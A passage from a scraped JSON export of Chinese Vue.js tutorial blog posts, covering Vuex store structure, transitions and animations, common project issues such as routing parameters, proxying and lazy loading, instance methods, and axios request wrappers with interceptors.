(state) =&gt; &#123; return `My name is $&#123;state.name&#125;, I am $&#123;state.age&#125;.`;&#125; mutation-type示例 将所有mutations的函数名放在这个文件里 12export const SET_NAME = &apos;SET_NAME&apos;;export const SET_AGE = &apos;SET_AGE&apos;; mutations示例 12345678910import * as types from './mutation-type.js';export default &#123; [types.SET_NAME](state, name) &#123; state.name = name; &#125;, [types.SET_AGE](state, age) &#123; state.age = age; &#125;&#125;; actions示例 异步操作、多个commit时 12345678import * as types from './mutation-type.js';export default &#123; nameAsyn(&#123;commit&#125;, &#123;age, name&#125;) &#123; commit(types.SET_NAME, name); commit(types.SET_AGE, age); &#125;&#125; modules–m1.js示例 如果不是很复杂的应用，一般来讲是不会分模块的 123456export default &#123; state: &#123;&#125;, getters: &#123;&#125;, mutations: &#123;&#125;, actions: &#123;&#125;&#125; index.js示例（组装vuex) 12345678910111213141516171819202122232425import vue from 'vue';import vuex from 'vuex';import state from './state.js';import * as getters from './getters.js';import mutations from './mutations.js';import actions from './actions.js';import m1 from './modules/m1.js';import m2 from './modules/m2.js';import createLogger from 'vuex/dist/logger'; // 修改日志vue.use(vuex);const debug = process.env.NODE_ENV !== 'production'; // 开发环境中为true，否则为falseexport default new vuex.Store(&#123; state, getters, mutations, actions, modules: &#123; m1, m2 &#125;, plugins: debug ? [createLogger()] : [] // 开发环境下显示vuex的状态修改&#125;); 最后将store实例挂载到main.js里面的vue上去就行了 1234567import store from './store/index.js';new Vue(&#123; el: '#app', store, render: h =&gt; h(App)&#125;); 在vue组件中使用时，我们通常会使用mapGetters、mapActions、mapMutations，然后就可以按照vue调用methods和computed的方式去调用这些变量或函数，示例如 1234567891011121314151617181920import &#123;mapGetters, mapMutations, mapActions&#125; from 'vuex';/* 只写组件中的script部分 */export default &#123; computed: &#123; ...mapGetters([ name, age ]) &#125;, methods: &#123; ...mapMutations(&#123; setName: 'SET_NAME', setAge: 'SET_AGE' &#125;), ...mapActions([ nameAsyn ]) &#125;&#125;; 二、modules 在 src 目录下 , 新建一个 store 文件夹 , 然后在里面新建一个 index.js 123456789import Vue from 'vue'import vuex from 'vuex'Vue.use(vuex);export default new vuex.Store(&#123; state:&#123; show:false &#125;&#125;) 在 main.js 里的代码应该改成,在实例化 Vue对象时加入 store 对象 12345678910//vueximport store from './store'new Vue(&#123; el: '#app', router, store,//使用store template: '&lt;App/&gt;', components: &#123; App &#125;&#125;) 这样就把 store 分离出去了 , 那么还有一个问题是 : 这里 $store.state.show 无论哪个组件都可以使用 , 那组件多了之后 , 状态也多了 , 这么多状态都堆在 store 文件夹下的 index.js 不好维护怎么办 ? 我们可以使用 vuex 的 modules , 把 store 文件夹下的 index.js 改成 1234567891011import Vue from 'vue'import vuex from 'vuex'Vue.use(vuex);import dialog_store from '../components/dialog_store.js';//引入某个store对象export default new vuex.Store(&#123; modules: &#123; dialog: dialog_store &#125;&#125;) 这里我们引用了一个 dialog_store.js , 在这个 js文件里我们就可以单独写 dialog 组件的状态了 12345export default &#123; state:&#123; show:false &#125;&#125; 做出这样的修改之后 , 我们将之前我们使用的 $store.state.show 统统改为 $store.state.dialog.show 即可 如果还有其他的组件需要使用 vuex , 就新建一个对应的状态文件 , 然后将他们加入 store文件夹下的 index.js文件中的 modules 中 1234modules: &#123; dialog: dialog_store, other: other,//其他组件&#125; 三、mutations 对vuex 的依赖仅仅只有一个 $store.state.dialog.show 一个状态 , 但是如果我们要进行一个操作 , 需要依赖很多很多个状态 , 那管理起来又麻烦了 mutations里的操作必须是同步的 1234567891011export default &#123; state:&#123;//state show:false &#125;, mutations:&#123; switch_dialog(state)&#123;//这里的state对应着上面这个state state.show = state.show?false:true; //你还可以在这里执行其他的操作改变state &#125; &#125;&#125; 使用 mutations 后 , 原先我们的父组件可以改为 123456789101112131415&lt;template&gt; &lt;div id=\"app\"&gt; &lt;a href=\"javascript:;\" @click=\"$store.commit('switch_dialog')\"&gt;点击&lt;/a&gt; &lt;t-dialog&gt;&lt;/t-dialog&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import dialog from './components/dialog.vue'export default &#123; components:&#123; \"t-dialog\":dialog &#125;&#125;&lt;/script&gt; 使用 $store.commit(&#39;switch_dialog&#39;) 来触发 mutations 中的 switch_dialog 方法 四、actions 多个 state 的操作 , 使用 mutations会来触发会比较好维护 , 那么需要执行多个 mutations 就需要用 action 了 1234567891011121314151617export default &#123; state:&#123;//state show:false &#125;, mutations:&#123; switch_dialog(state)&#123;//这里的state对应着上面这个state state.show = state.show?false:true; //你还可以在这里执行其他的操作改变state &#125; &#125;, actions:&#123; switch_dialog(context)&#123;//这里的context和我们使用的$store拥有相同的对象和方法 context.commit('switch_dialog'); //你还可以在这里触发其他的mutations方法 &#125;, &#125;&#125; 那么 , 在之前的父组件中 , 我们需要做修改 , 来触发 action 里的 switch_dialog 方法 123456789101112131415&lt;template&gt; &lt;div id=\"app\"&gt; &lt;a href=\"javascript:;\" @click=\"$store.dispatch('switch_dialog')\"&gt;点击&lt;/a&gt; &lt;t-dialog&gt;&lt;/t-dialog&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import dialog from './components/dialog.vue'export default &#123; components:&#123; \"t-dialog\":dialog &#125;&#125;&lt;/script&gt; 使用 $store.dispatch(&#39;switch_dialog&#39;) 来触发 action 中的 switch_dialog 方法。 官方推荐 , 将异步操作放在 action中 五、getters getters和 vue 中的computed 类似 , 都是用来计算 state 然后生成新的数据 ( 状态 ) 的 假如我们需要一个与状态 show 刚好相反的状态 , 使用 vue 中的 computed 可以这样算出来 12345computed()&#123; not_show()&#123; return !this.$store.state.dialog.show; &#125;&#125; 那么 , 如果很多很多个组件中都需要用到这个与 show刚好相反的状态 , 那么我们需要写很多很多个 not_show, 使用 getters就可以解决这种问题 12345678910111213141516171819202122export default &#123; state:&#123;//state show:false &#125;, getters:&#123; not_show(state)&#123;//这里的state对应着上面这个state return !state.show; &#125; &#125;, mutations:&#123; switch_dialog(state)&#123;//这里的state对应着上面这个state state.show = state.show?false:true; //你还可以在这里执行其他的操作改变state &#125; &#125;, actions:&#123; switch_dialog(context)&#123;//这里的context和我们使用的$store拥有相同的对象和方法 context.commit('switch_dialog'); //你还可以在这里触发其他的mutations方法 &#125;, &#125;&#125; 我们在组件中使用 $store.state.dialog.show 来获得状态 show , 类似的 , 我们可以使用 $store.getters.not_show 来获得状态 not_show 注意 : $store.getters.not_show 的值是不能直接修改的 , 需要对应的 state 发生变化才能修改 六、mapState、mapGetters、mapActions 很多时候 , $store.state.dialog.show 、$store.dispatch(&#39;switch_dialog&#39;) 这种写法很不方便 使用 mapState、mapGetters、mapActions 就不会这么复杂了 12345678910111213141516&lt;template&gt; &lt;el-dialog :visible.sync=\"show\"&gt;&lt;/el-dialog&gt;&lt;/template&gt;&lt;script&gt;import &#123;mapState&#125; from 'vuex';export default &#123; computed:&#123; //这里的三点叫做 : 扩展运算符 ...mapState(&#123; show:state=&gt;state.dialog.show &#125;), &#125;&#125;&lt;/script&gt; 相当于 1234567891011121314&lt;template&gt; &lt;el-dialog :visible.sync=\"show\"&gt;&lt;/el-dialog&gt;&lt;/template&gt;&lt;script&gt;import &#123;mapState&#125; from 'vuex';export default &#123; computed:&#123; show()&#123; return this.$store.state.dialog.show; &#125; &#125;&#125;&lt;/script&gt; mapGetters、mapActions 和 mapState 类似 , mapGetters 一般也写在 computed 中 , mapActions 一般写在 methods 中","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://ru23.com/tags/Vue/"}]},{"title":"vue过渡与动画（十五）","slug":"2018-03-vue-animation-transition","date":"2018-08-28T12:10:32.000Z","updated":"2018-10-24T03:46:02.420Z","comments":true,"path":"note/880e7c61.html","link":"","permalink":"https://ru23.com/note/880e7c61.html","excerpt":"","text":"一、transition标签结合css image.png vue.2.0中的过渡动画利用自身的transition组件实现 有四种情形可以实现过渡效果 利用v-if渲染元素时 利用v-show展示或者隐藏元素时应用过渡生效 动态组件(把几个组件挂载到一个父节点上，在父节点绑定变量来决定显示哪个子组件) 组件根节点 过渡有两种总的状态：即enter(过渡开始)和leave(过渡结束) 这两中状态再细分，可分出6种状态，对应6个类名 在进入/离开的过渡中，会有 6 个 class 切换 transition image.png 控制元素的滑入与滑出，例如：DOM结构，要在transition组件上添加name属性，并在css中使用name的属性值替代以上v-状态种的v作为类名 123456789&lt;transition name=\"slide\"&gt; &lt;div class=\"food\" v-show=\"showFlag\" @click=\"hide\"&gt; &lt;div class=\"food-content\"&gt; &lt;div class=\"imang-header\"&gt; &lt;img :src=\"food.image\" &gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/transition&gt; css样式 12345678910111213141516171819.food position :fixed left:0 top:0 bottom: 48px z-index:30 width :100% background :#fff /*定义元素最终移动到的位置，以及移动到此位置需要的时间*/.slide-enter-active transition: all .5s ease transform:translate3d(0,0,0) /*定义元素从什么位置离开，以及离开岛指定位置所需的时间*/.slide-leave-active transition: all .5s ease transform:translate3d(0,0,0) /*定义元素从100%的位置移入到0，过渡结束后再从0回到100%的位置*/.slide-enter,.slide-leave-to transform:translate3d(100%,0,0) 单组件过渡 123&lt;transition name=\"fade\"&gt; &lt;p v-if=\"show\"&gt;hello&lt;/p&gt;&lt;/transition&gt; 123456.fade-enter-active, .fade-leave-active &#123; transition: opacity .5s;&#125;.fade-enter, .fade-leave-to &#123; opacity: 0;&#125; 类似的只需要在过度类中填写动画即可 1234567891011121314151617.fade-enter-active, .fade-leave-active &#123; animation: fade-in .5s;&#125;.fade-enter, .fade-leave-to &#123; animation:fade-in .5s reverse;&#125;@keyframes bounce-in &#123; 0% &#123; ooacity: 0; &#125; 50% &#123; ooacity: .5; &#125; 100% &#123; ooacity: 1; &#125;&#125; 二、自定义过渡类名实现动画 image.png animate.css结合transition https://daneden.github.io/animate.css/ 1234567891011&lt;div id=\"app\"&gt; &lt;button @click=\"toggle\"&gt;显示/隐藏&lt;/button&gt;&lt;br&gt; &lt;transition enter-active-class=\"animated fadeInRight\" leave-active-class=\"animated fadeOutRight\" &gt; &lt;!-- 坑：span行内元素（行内元素没有宽） 应该改为块级元素 --&gt; &lt;!-- &lt;span class=\"show\" v-show=\"isshow\"&gt;it创业&lt;/span&gt; --&gt; &lt;div style=\"width:200px\" class=\"show\" v-show=\"isshow\"&gt;it创业&lt;/div&gt; &lt;/transition&gt; &lt;/div&gt; 三、js钩子函数实现动画 这些钩子函数可以结合 CSS transitions/animations使用，也可以单独使用。 12345678910111213&lt;transition v-on:before-enter=\"beforeEnter\" v-on:enter=\"enter\" v-on:after-enter=\"afterEnter\" v-on:enter-cancelled=\"enterCancelled\" v-on:before-leave=\"beforeLeave\" v-on:leave=\"leave\" v-on:after-leave=\"afterLeave\" v-on:leave-cancelled=\"leaveCancelled\"&gt; &lt;!-- ... --&gt;&lt;/transition&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243// ...methods: &#123; // -------- // 进入中 // -------- beforeEnter: function (el) &#123; // ... &#125;, // 此回调函数是可选项的设置 // 与 CSS 结合时使用 enter: function (el, done) &#123; // ... done() &#125;, afterEnter: function (el) &#123; // ... &#125;, enterCancelled: function (el) &#123; // ... &#125;, // -------- // 离开时 // -------- beforeLeave: function (el) &#123; // ... &#125;, // 此回调函数是可选项的设置 // 与 CSS 结合时使用 leave: function (el, done) &#123; // ... done() &#125;, afterLeave: function (el) &#123; // ... &#125;, // leaveCancelled 只用于 v-show 中 leaveCancelled: function (el) &#123; // ... &#125;&#125; 当只用 JavaScript 过渡的时候，在 enter 和 leave 中必须使用 done 进行回调。否则，它们将被同步调用，过渡会立即完成","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://ru23.com/tags/Vue/"}]},{"title":"vue项目中的痛点（十四）","slug":"2018-03-vue-project-dev-question","date":"2018-08-28T09:10:30.000Z","updated":"2018-10-24T03:46:02.476Z","comments":true,"path":"note/c560373d.html","link":"","permalink":"https://ru23.com/note/c560373d.html","excerpt":"","text":"一、列表进入详情页传参 例如商品列表页面前往商品详情页面，需要传一个商品id 1&lt;router-link :to=\"&#123;path: 'detail', query: &#123;id: 1&#125;&#125;\"&gt;前往detail页面&lt;/router-link&gt; c页面的路径为http://localhost:8080/#/detail?id=1，可以看到传了一个参数id=1，并且就算刷新页面id也还会存在。此时在c页面可以通过id来获取对应的详情数据，获取id的方式是this.$route.query.id vue传参方式有：query、params+动态路由传参 query通过path切换路由，params通过name切换路由 1234// query通过path切换路由&lt;router-link :to=\"&#123;path: 'Detail', query: &#123; id: 1 &#125;&#125;\"&gt;前往Detail页面&lt;/router-link&gt;// params通过name切换路由&lt;router-link :to=\"&#123;name: 'Detail', params: &#123; id: 1 &#125;&#125;\"&gt;前往Detail页面&lt;/router-link&gt; query通过this.$route.query来接收参数，params通过this.$route.params来接收参数 123456789// query通过this.$route.query接收参数created () &#123; const id = this.$route.query.id;&#125;// params通过this.$route.params来接收参数created () &#123; const id = this.$route.params.id;&#125; query传参的url展现方式：/detail?id=1&amp;user=123&amp;identity=1&amp;更多参数 params＋动态路由的url方式：/detail/123 params动态路由传参，一定要在路由中定义参数，然后在路由跳转的时候必须要加上参数，否则就是空白页面 12345&#123; path: &apos;/detail/:id&apos;, name: &apos;Detail&apos;, component: Detail &#125;, 注意，params传参时，如果没有在路由中定义参数，也是可以传过去的，同时也能接收到，但是一旦刷新页面，这个参数就不存在了。这对于需要依赖参数进行某些操作的行为是行不通的 12345678910111213141516171819// 定义的路由中，只定义一个id参数&#123; path: 'detail/:id', name: 'Detail', components: Detail&#125;// template中的路由传参，// 传了一个id参数和一个token参数// id是在路由中已经定义的参数，而token没有定义&lt;router-link :to=\"&#123;name: 'Detail', params: &#123; id: 1, token: '123456' &#125;&#125;\"&gt;前往Detail页面&lt;/router-link&gt;// 在详情页接收created () &#123; // 以下都可以正常获取到 // 但是页面刷新后，id依然可以获取，而token此时就不存在了 const id = this.$route.params.id; const token = this.$route.params.token;&#125; 综上：尽量使用query来传参 二、请求服务器接口跨域 本地开发项目请求服务器接口的时候，因为客户端的同源策略，导致了跨域的问题 vue-cli初始化的项目，在配置文件中提供了proxyTable来解决本地开发的跨域问题。config文件的index.js文件中，找到proxyTable选项，进行如下配置 12345678910proxyTable: &#123; // 用‘/api’开头，代理所有请求到目标服务器 '/api': &#123; target: 'http://jsonplaceholder.typicode.com', // 接口域名 changeOrigin: true, // 是否启用跨域 pathRewrite: &#123; // '^/api': '' &#125; &#125;&#125; 例如请求接口：/api/posts/1 ==&gt;http://jsonplaceholder.typicode.com/posts/1 这个时候就可以在本地环境请求后台接口了 三、axios的封装和API接口的统一管理 axios的封装，主要是用来帮我们进行请求的拦截和响应的拦截。 在请求的拦截中我们可以携带userToken，post请求头、qs对post提交数据的序列化等- 在响应的拦截中，我们可以进行根据状态码来进行错误的统一处理等等。 axios接口的统一管理，是做项目时必须的流程。这样可以方便我们管理我们的接口，在接口更新时我们不必再返回到我们的业务代码中去修改接口 四、UI库的按需加载 这里以vant的按需加载为例，演示vue中ui库怎样进行按需加载 安装： cnpm i vant -S 安装babel-plugin-import插件使其按需加载： cnpm i babel-plugin-import -D 在 .babelrc文件中中添加插件配置 12345678910111213141516libraryDirectory &#123; \"plugins\": [ // 这里是原来的代码部分 // ………… // 这里是要我们配置的代码 [\"import\", &#123; \"libraryName\": \"vant\", \"libraryDirectory\": \"es\", \"style\": true &#125; ] ] &#125; 在main.js中按需加载你需要的插件 123456// 按需引入vant组件import &#123; DatetimePicker, Button, List &#125; from 'vant'; 使用组件 1234// 使用vant组件Vue.use(DatetimePicker) .use(Button) .use(List); 最后在在页面中使用： 1&lt;van-button type=\"primary\"&gt;按钮&lt;/van-button&gt; 五、定时器问题 在a页面写一个定时，让他每秒钟打印一个1，然后跳转到b页面，此时可以看到，定时器依然在执行。这样是非常消耗性能的 解决方案一 在data函数里面进行定义定时器名称 12345data() &#123; return &#123; timer: null // 定时器名称 &#125; &#125;, 然后这样使用定时器 123this.timer = (() =&gt; &#123; // 某些操作&#125;, 1000) 最后在beforeDestroy()生命周期内清除定时器 1234beforeDestroy() &#123; clearInterval(this.timer); this.timer = null;&#125; 方案1有两点不好的地方 它需要在这个组件实例中保存这个 timer，如果可以的话最好只有生命周期钩子可以访问到它。这并不算严重的问题，但是它可以被视为杂物。 我们的建立代码独立于我们的清理代码，这使得我们比较难于程序化的清理我们建立的所有东西 解决方案2 该方法是通过$once这个事件侦听器器在定义完定时器之后的位置来清除定时器。以下是完整代码 1234567const timer = setInterval(() =&gt;&#123; // 某些定时器操作 &#125;, 500); // 通过$once来监听定时器，在beforeDestroy钩子可以被清除。this.$once('hook:beforeDestroy', () =&gt; &#123; clearInterval(timer); &#125;) 六、rem文件的导入问题 在做手机端时，适配是必须要处理的一个问题。例如，我们处理适配的方案就是通过写一个rem.js，原理很简单，就是根据网页尺寸计算html的font-size大小 12345678910; (function(c, d) &#123; var e = document.documentElement || document.body, a = \"orientationchange\" in window ? \"orientationchange\": \"resize\", b = function() &#123; var f = e.clientWidth; e.style.fontSize = (f &gt;= 750) ? \"100px\": 100 * (f / 750) + \"px\" &#125;; b(); c.addEventListener(a, b, false)&#125;)(window); 在main.js中，直接import &#39;./config/rem&#39;导入即可。import的路径根据你的文件路径去填写 七、打包后生成很大的.map文件 项目打包后，代码都是经过压缩加密的，如果运行时报错，输出的错误信息无法准确得知是哪里的代码报错。 而生成的.map后缀的文件，就可以像未加密的代码一样，准确的输出是哪一行哪一列有错可以通过设置来不生成该类文件。但是我们在生成环境是不需要.map文件的，所以可以在打包时不生成这些文件 在config/index.js文件中，设置productionSourceMap: false,就可以不生成.map文件 八、fastClick的300ms延迟 在main.js中引入fastClick和初始化 12import FastClick from 'fastclick'; // 引入插件FastClick.attach(document.body); // 使用 fastclick 九、路由懒加载（延迟加载） 路由懒加载可以帮我们在进入首屏时不用加载过度的资源，从而减少首屏加载速度 非懒加载写法 12345678910import Index from '@/page/index/index';export default new Router(&#123; routes: [ &#123; path: '/', name: 'Index', component: Index &#125; ]&#125;) 路由懒加载写法 123456789export default new Router(&#123; routes: [ &#123; path: '/', name: 'Index', component: resolve =&gt; require(['@/view/index/index'], resolve) &#125; ]&#125;) 十、开启gzip压缩代码 spa这种单页应用，首屏由于一次性加载所有资源，所有首屏加载速度很慢。解决这个问题非常有效的手段之一就是前后端开启gizp（其他还有缓存、路由懒加载等等）。gizp其实就是帮我们减少文件体积，能压缩到30%左右，即100k的文件gizp后大约只有30k` vue-cli初始化的项目中，是默认有此配置的，只需要开启即可。但是需要先安装插件 1npm i compression-webpack-plugin 在config/index.js中开启即可 12345build: &#123; ……………… productionGzip: true, // false不开启gizp，true开启 ………………&#125; 这里前端进行的打包时的gzip，但是还需要后台服务器的配置。配置是比较简单的，配置几行代码就可以了","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://ru23.com/tags/Vue/"}]},{"title":"vue实例方法（十三)","slug":"2018-03-vue-vm-method-props","date":"2018-08-28T08:04:43.000Z","updated":"2018-10-24T03:46:02.419Z","comments":true,"path":"note/e3a5e3c3.html","link":"","permalink":"https://ru23.com/note/e3a5e3c3.html","excerpt":"","text":"一、Vue之实例属性 image.png Vue 实例暴露了一些有用的实例属性与方法。这些属性与方法都有前缀 $，以便与代理的数据属性区分 组件树 $parent：用来访问组件实例的父实例 $root: 用来访问当前组件树的根实例 $children:用来访问当前组件实例的直接子组件实例 $refs:用来访问v-ref指令的子组件 DOM访问 $el：用来挂载当前组件实例的dom元素 $els：用来访问$el元素中使用了v-el指令的DOM元素 12345678910111213&lt;div id=\"app2\"&gt; &#123;&#123; message &#125;&#125;&lt;/div&gt;&lt;script&gt; var vm2 = new Vue(&#123; el:\"#app2\", data:&#123; message : \"I am message.\" &#125; &#125;); console.log(vm2.$el); //vm2.$el === 原生js中document.getElementById(\"app2\") vm2.$el.style.color = \"red\"; //变成红色&lt;/script&gt; 数据访问 $data：用来访问组件实例观察的数据对象 $options：用来访问组件实例化时的初始化选项对象 DOM方法的使用 $appendTo(elementOrSelector, callback)：将el所指的DOM元素插入目标元素 $before(elementOrSelector, callback)：将el所指的DOM元素或片段插入目标元素之前 $after(elementOrSelector, callback)：将el所指的DOM元素或片段插入目标元素之后 $remove(callback)：将el所指的DOM元素或片段从DOM中删除 $nextTick(callback)：用来在下一次DOM更新循环后执行指定的回调函数 event方法的使用 监听 $on(event, callback)：监听实例的自定义事件 $once(event, callback)：同上，但只能触发一次 触发 $dispatch(event, args)：派发事件，先在当前实例触发，再沿父链一层层向上，对应的监听函数返回false停止 $broadcast(event, args)：广播事件，遍历当前实例的$children，如果对应的监听函数返回false，就停止 $emit(event, args)：触发事件 1234567891011121314151617181920212223242526272829303132&lt;div id=\"ap2\"&gt; &lt;p&gt;&#123;&#123; num &#125;&#125;&lt;/p&gt; &lt;button @click=\"increase1\"&gt; add &lt;/button&gt;&lt;/div&gt;&lt;button onclick=\"reduce2()\"&gt; reduce2 &lt;/button&gt; &lt;button onclick=\"offReduce()\"&gt; off reduce &lt;/button&gt;&lt;script&gt; var ap2 = new Vue(&#123; el:\"#ap2\", data:&#123; num:5 &#125;, methods:&#123; increase1:function () &#123; this.num ++; &#125; &#125; &#125;); // .$on定义事件 .$once定义只触发一次的事件 ap2.$on(\"reduce\",function (diff) &#123; ap2.num -= diff ; &#125;); // .$emit触发事件 function reduce2() &#123; ap2.$emit(\"reduce\", 2); &#125; // .$off解除事件 解除后，定义的reduce事件将不再执行 function offReduce() &#123; ap2.$off(\"reduce\"); &#125;&lt;/script&gt; 二、实例方法2.1 $.watch()123456789101112131415var data = &#123; a: 1 &#125;var vm = new Vue(&#123; el: '#example', data: data&#125;) vm.$data === data // -&gt; truevm.$el === document.getElementById('example') // -&gt; true // $watch 是一个实例方法vm.$watch('a', function (newVal, oldVal) &#123; &#125;) // 这个回调将在 `vm.a` 改变后调用 2.2 vm.$nextTick 将回调延迟到下次 DOM 更新循环之后执行。在修改数据之后立即使用它，然后等待 DOM 更新。它跟全局方法 Vue.nextTick 一样，不同的是回调的 this 自动绑定到调用它的实例上 12345678910111213141516171819202122232425262728&lt;div id=\"app\"&gt;&lt;/div&gt;&lt;button onclick=\"vm.$destroy()\"&gt;销毁实例 $destroy&lt;/button&gt;&lt;button onclick=\"vm.$forceUpdate()\"&gt;刷新构造器 $forceUpdate&lt;/button&gt;&lt;button onclick=\"edit()\"&gt;更新 $.nextTick(fn)&lt;/button&gt;&lt;script&gt; var Header = Vue.extend(&#123; template:`&lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;`, data:function () &#123; return &#123; message:\"I am message\" &#125; &#125;, updated:function () &#123; console.log(\"updated 更新之后\"); &#125;, destroyed:function () &#123; console.log(\"destroy 销毁之后\"); &#125; &#125;); var vm = new Header().$mount(\"#app\"); function edit() &#123; vm.message = \"new message\"; //更新数据 vm.$nextTick(function () &#123; //更新完成后调用 console.log(\"更新完后，我被调用\"); &#125;) &#125; 放在Vue.nextTick()回调函数中的执行的应该是会对DOM进行操作的 js代码 什么时候需要用的Vue.nextTick() 你在Vue生命周期的created()钩子函数进行的DOM操作一定要放在Vue.nextTick()的回调函数中。原因是什么呢，原因是在created()钩子函数执行的时候DOM 其实并未进行任何渲染，而此时进行DOM操作无异于徒劳，所以此处一定要将DOM操作的js代码放进Vue.nextTick()的回调函数中。与之对应的就是mounted钩子函数，因为该钩子函数执行时所有的DOM挂载和渲染都已完成，此时在该钩子函数中进行任何DOM操作都不会有问题 。 在数据变化后要执行的某个操作，而这个操作需要使用随数据改变而改变的DOM结构的时候，这个操作都应该放进Vue.nextTick()的回调函数中 为了在数据变化之后等待 Vue 完成更新 DOM ，可以在数据变化之后立即使用 Vue.nextTick(callback) 。这样回调函数在 DOM 更新完成后就会调用","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://ru23.com/tags/Vue/"}]},{"title":"vue-axios封装请求（十二）","slug":"2018-03-vue-axios","date":"2018-08-28T07:35:32.000Z","updated":"2018-10-24T03:46:02.422Z","comments":true,"path":"note/ed55b987.html","link":"","permalink":"https://ru23.com/note/ed55b987.html","excerpt":"","text":"一、axios 简介 axios 是一个基于Promise用于浏览器和 nodejs 的 HTTP 客户端，它本身具有以下特征： 从浏览器中创建 XMLHttpRequest 从 node.js 发出 http 请求 支持Promise API 拦截请求和响应 转换请求和响应数据 取消请求 自动转换JSON数据 客户端支持防止CSRF/XSRF 二、axios基础 axios.request（config） axios.get（url [，config]） axios.delete（url [，config]） axios.head（url [，config]） axios.options（url [，config]） axios.post（url [，data [，config]]） axios.put（url [，data [，config]]） axios.patch（url [，data [，config]]） 三、执行 GET 请求123456789101112131415161718192021// 向具有指定ID的用户发出请求axios.get('/user?ID=12345').then(function (res) &#123; console.log(res);&#125;).catch(function (error) &#123; console.log(error);&#125;); // 也可以通过 params 对象传递参数axios.get('/user', &#123; params: &#123; ID: 12345 &#125;&#125;).then(function (response) &#123; console.log(response);&#125;).catch(function (error) &#123; console.log(error);&#125;); 四、执行 POST 请求12345678910111213axios.post('/user', &#123; userId:\"123\"&#125;,&#123; headers:&#123; token:\"abc\" &#125;&#125;).then(function (res) &#123; console.log(res);&#125;).catch(function (error) &#123; console.log(error);&#125;); 五、通过配置方式发送请求 get请求是发送参数，在params中定义。而POST请求是发送request body,需要在data中定义 123456789101112131415161718192021222324252627// get 在params中定义axios(&#123; url:\"pakage.json\", method:\"get\", params:&#123; userId:\"123\" &#125;, headers:&#123; token:\"http-test\" &#125;&#125;).then(res=&gt;&#123; console.log(res.data);&#125;)// post 在data中定义axios(&#123; url:\"pakage.json\", method:\"post\", data:&#123; userId:\"123\" &#125;, headers:&#123; token:\"http-test\" &#125;&#125;).then(res=&gt;&#123; console.log(res.data);&#125;) 六、执行多个并发请求1234567891011121314function getUserAcount()&#123; // 返回一个promise对象 return axios.get(\"/user/1234\");&#125;function getUserPermissions()&#123; // 返回一个promise对象 return axios.get(\"/user/1234/getUserPermissions\");&#125;//一次性返回两个接口axios.all([getUserAccount(),getUserPerssions()]).then(axios.spread((acct, perms) =&gt; &#123; // spread展开两个返回的结果 //两个请求现已完成&#125;)) 七、全局拦截12345678910111213141516171819202122232425262728new Vue(&#123; el:\"app\", data:&#123; msg:\"\" &#125;, // 初始化生命周期的一个函数 mounted:function()&#123; //拦截请求之前 axios.interceptors.request.use(config=&gt;&#123; //这里做一些拦截操作,拦截用户的请求 请求之前做一些loading处理 return config; &#125;) //拦截响应之后处理 axios.interceptors.response.use(response=&gt;&#123; //这里做一些拦截操作,响应以后做什么，在返回数据 return response; &#125;) &#125;, methods: &#123; get: function() &#123; &#125;, post:function() &#123; &#125; &#125;&#125;) 八、请求封装、异常统一处理 vue中采用axios处理网络请求，避免请求接口重复代码，以及各种网络情况造成的异常情况的判断，采用axios请求封装和异常拦截操作 8.1 axios 请求封装1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768// 引入axios文件包import axios from 'axios'// POST 方法封装 (参数处理)export const postRequest = (url, params) =&gt; &#123; return axios(&#123; method: 'post', url: url, data: params, transformRequest: [function (data) &#123; let ret = '' for (let it in data) &#123; ret += encodeURIComponent(it) + '=' + encodeURIComponent(data[it]) + '&amp;' &#125; return ret &#125;], headers: &#123; 'Content-Type': 'application/x-www-form-urlencoded' &#125; &#125;);&#125;// POST 方法封装 (文件上传)export const uploadFileRequest = (url, params) =&gt; &#123; return axios(&#123; method: 'post', url: url, data: params, headers: &#123; 'Content-Type': 'multipart/form-data' &#125; &#125;);&#125;// GET 方法封装export const getRequest = (url) =&gt; &#123; return axios(&#123; method: 'get', url: url &#125;);&#125;// PUT 方法封装export const putRequest = (url, params) =&gt; &#123; return axios(&#123; method: 'put', url: url, data: params, transformRequest: [function (data) &#123; let ret = '' for (let it in data) &#123; ret += encodeURIComponent(it) + '=' + encodeURIComponent(data[it]) + '&amp;' &#125; return ret &#125;], headers: &#123; 'Content-Type': 'application/x-www-form-urlencoded' &#125; &#125;);&#125;// DELETE 方法封装export const deleteRequest = (url) =&gt; &#123; return axios(&#123; method: 'delete', url: url &#125;);&#125; 8.2 axios请求异常统一处理12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091// 引入依赖包import axios from 'axios'import &#123;Message&#125; from 'element-ui'// REQUEST 请求异常拦截axios.interceptors.request.use(config=&gt; &#123; //========== 所有请求之前都要执行的操作 ============== return config;&#125;, err=&gt; &#123; //================== 错误处理 ==================== Message.error(&#123;message: '请求超时!'&#125;); return Promise.resolve(err);&#125;)// RESPONSE 响应异常拦截axios.interceptors.response.use(data=&gt; &#123;//============== 所有请求完成后都要执行的操作 ==================// 第一种方式 // 根据返回的code值来做不同的处理（和后端约定） switch (data.code) &#123; case '0': // exp: 修复iPhone 6+ 微信点击返回出现页面空白的问题 if (isIOS()) &#123; // 异步以保证数据已渲染到页面上 setTimeout(() =&gt; &#123; // 通过滚动强制浏览器进行页面重绘 document.body.scrollTop += 1 &#125;, 0) &#125; // 这一步保证数据返回，如果没有return则会走接下来的代码，不是未登录就是报错 return data // 需要重新登录 case 'SHIRO_E5001': // 微信生产环境下授权登录 if (isWeChat() &amp;&amp; IS_PRODUCTION) &#123; axios.get(apis.common.wechat.authorizeUrl).then((&#123; result &#125;) =&gt; &#123; location.replace(global.decodeURIComponent(result)) &#125;) &#125; else &#123; // 